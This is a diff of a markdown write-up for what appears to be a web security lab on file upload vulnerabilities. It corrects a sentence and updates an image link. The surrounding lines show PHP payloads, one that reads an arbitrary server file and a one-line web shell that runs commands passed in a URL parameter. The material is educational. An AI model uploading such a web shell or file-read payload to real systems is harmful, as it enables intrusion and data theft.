@@ -27,11 +27,12 @@ You can log in to your own account using the following credentials: `wiener:pete
    ```php
    <?php echo file_get_contents('/path/to/target/file'); ?>
    ```
-   We can also could attempt to use others like this:
+   We could also attempt to use others like this:
    ```php
    <?php system($_GET['cmd']); ?>
    ```
-   ![image](https://github.com/user-attachments/assets/f35df2bb-1d98-46ce-87de-d9efa0771452
+   ![image](https://github.com/user-attachments/assets/5cbec42a-8c07-46ae-9eb2-d35de568c9cc)
+
 
    ## **Accessing the Malicious File**
 3. **Navigating to the Uploaded File:**  
